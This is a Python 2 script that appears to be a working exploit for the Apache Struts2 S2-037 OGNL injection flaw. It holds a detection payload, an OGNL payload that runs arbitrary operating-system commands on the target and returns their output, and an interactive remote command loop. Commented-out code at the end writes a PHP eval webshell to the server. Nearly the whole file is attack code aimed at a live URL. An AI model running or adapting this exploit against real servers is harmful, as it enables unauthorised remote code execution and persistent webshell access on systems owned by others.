# coding:utf-8
import requests
import re
# PoC
s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
#
# CommandExP
cmd_exp = "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command={}"
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'
}


def verity(url):

    try:
        poc_url = url+s2037_poc
        print "."*len(url)
        print "[checking] " + url
        print "."*len(url)
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            if len(res.content) < 40: # 34 length
                return True
            else:
                return False
        else:
            return False

    except Exception, e:
        print "Failed to connection target, try again.."
        return False

url = "http://localhost:8080/orders/4"

# 执行一句话命令
def ExecOneCmd(exp_url , command):
    try:
        get_url_exp = exp_url + cmd_exp.format(command)
        r = requests.get(get_url_exp, headers=headers, timeout=5)
        print r.content
        # resp = r.text.encode("utf-8")
        # return resp
    except:
        return False

def cmdTool(exp_url):

    get_url_exp = exp_url + cmd_exp
    while True:
        comm = raw_input("~$ ")
        if comm == "q":
            exit(0)
        temp_exp = get_url_exp.replace("ShowMeCommand", comm)
        try:
            print "="*80
            print "[Result]"
            print "_"*80
            r = requests.get(temp_exp, headers=headers, timeout=5)
            resp = r.text.encode("utf-8")
            print resp
            print "="*80
        except:
            print "error,try again.."
# res = cmdTool(url)
# 寻找文件夹
# file = ExecOneCmd(url, "touch /home/sas.test")
file = ExecOneCmd(url,"ls /home")
# print file

# re_tomfile = re.compile(r'.+?tomcat')
# tomfile = re_tomfile.search(file)
# if tomfile:
#     wbapps = tomfile.group() + "/webapps"
#     app = ExecOneCmd(url, 'ls {}'.format(wbapps))
#     re_appfile = re.compile(r'\w+')
#     appfile = re_appfile.search(app)
#     if appfile:
#         print appfile.group(0)

        # apppath = wbapps+'/'+appfile.group(1)


# jsp = unicode("<?php @eval($_POST[__RANDPASS__]); ?>", 'utf-8')
# test = 'swm'
# filename = "/home/test.swm"
# # command = "echo {} > {}".format(jsp, filename)
# # command = "echo {} > {}".format(test, filename)
# command = "cd /"
# # print command
# res = ExecOneCmd(url, command)